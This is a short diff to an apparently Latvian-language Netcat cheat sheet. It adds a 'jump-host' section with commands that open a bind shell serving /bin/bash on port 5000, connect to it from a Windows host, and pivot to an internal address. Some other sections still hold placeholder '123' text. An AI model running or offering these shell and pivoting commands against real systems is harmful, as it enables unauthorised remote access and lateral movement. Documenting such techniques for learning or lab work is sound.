@@ -355,10 +355,21 @@ nc -l -p 5000 -e /bin/bash
 nc 203.0.113.10 5000
 ```
 
-## 3.5. Spawn a reverse shell without Netcat
+## 3.5. Scenārijs ar jump-host
+### Uz Linux jump-hosta:
 ```
-123
+nc -l -p 5000 -e /bin/bash
 ```
+### Windows hosts pieslēdzas Linux jump-hostam:
+```
+nc 203.0.113.10 5000
+```
+### Pivot uz mērķi no jump-hosta
+```
+nc 192.168.1.101 5000
+
+```
+
 ## 3.6. Spawn a reverse shell without Netcat
 ```
 123
